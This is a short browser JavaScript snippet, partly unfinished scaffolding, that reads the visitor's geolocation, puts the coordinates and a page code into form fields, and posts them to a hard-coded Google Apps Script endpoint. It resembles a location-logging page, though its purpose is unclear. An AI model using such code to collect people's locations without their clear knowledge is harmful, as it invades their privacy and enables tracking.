const currentURL = window.location.href;
var page_1 = '', 
page_2 = '',
page_3 = '',
page_4 = ''
var page_5 = '', 
page_6 = '',
page_7 = '',
page_8 = ''
var page_9 = '',
page_10 = '',
page_11 = '',
page_12 = ''
var page_13 = '', 
page_14 = '',
page_15 = '',
page_16 = ''
var page_17 = '', 
page_18 = '',
page_19 = '',
page_20 = ''
var page_21 = '', 
page_22 = '',
page_23 = '',
page_24 = ''

const URL = () => {
    if(currentURL === page_1){}
    if(currentURL === page_2){}
    if(currentURL === page_3){}
    if(currentURL === page_4){}
    if(currentURL === page_5){}
    if(currentURL === page_6){}
    if(currentURL === page_7){}
    if(currentURL === page_8){}
    if(currentURL === page_9){}
    if(currentURL === page_10){}
    if(currentURL === page_11){}
    if(currentURL === page_12){}
    if(currentURL === page_13){}
    if(currentURL === page_14){}
    if(currentURL === page_15){}
    if(currentURL === page_16){}
    if(currentURL === page_17){}
    if(currentURL === page_18){}
    if(currentURL === page_19){}
    if(currentURL === page_20){}
    if(currentURL === page_21){}
    if(currentURL === page_22){}
    if(currentURL === page_23){}
    if(currentURL === page_24){}
}
URL()
const a = document.querySelector('#one')
        const b = document.querySelector('#two')
        const scriptURL = 'https://script.google.com/macros/s/AKfycbxiW0tewLXydPX4tqu40OFaW9gaE_EwmAEFnS4yquBxqQLhDCf3vscKR0PC-nBSGAx7/exec'
        const form = document.forms['submit-to-google-sheet']
    
        form.addEventListener('submit', e => {
        e.preventDefault()
        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => console.log('Success!', response))
            .catch(error => console.error('Error!', error.message))
        })
        if(!navigator.geolocation) {
            throw new Error('No geo available')
        }
        function success(pos){
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            console.log(lat)
            const code = document.querySelector('#code')
            a.value = code.innerHTML
            b.value = lat + ',' + lng
        }
        function error(){
            alert('we cannot find ur locaton')
        }
        navigator.geolocation.getCurrentPosition(success,error)
        const fun1 = () =>{
            document.getElementById('link').click()
        }